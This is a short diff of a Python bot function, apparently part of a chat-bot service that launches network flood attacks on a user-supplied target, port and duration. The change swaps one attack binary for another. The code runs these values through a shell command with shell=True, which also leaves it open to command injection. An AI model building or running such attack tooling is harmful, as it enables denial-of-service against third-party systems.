@@ -427,7 +427,7 @@ def start_attack_reply(message, target, port, time):
     
     try:
         # Execute attack
-        subprocess.run(f"./Moin {target} {port} {time} 200", shell=True)
+        subprocess.run(f"./kaluaa {target} {port} {time}", shell=True)
         
         # Calculate attack duration
         end_time = datetime.now(IST)
